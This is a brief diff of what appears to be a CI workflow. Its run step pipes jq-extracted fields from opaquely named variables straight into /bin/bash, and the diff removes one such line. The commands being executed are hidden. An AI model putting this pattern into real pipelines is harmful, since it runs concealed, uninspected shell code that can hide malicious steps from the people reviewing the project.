@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$jw619" | jq -r .jrm53 | /bin/bash
           echo $fe39 | jq -r .tqup380 | /bin/bash
           echo $gib471 | jq -r .a1191 | /bin/bash
-          printf '%s' "$a6986" | jq -r .ejo3 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
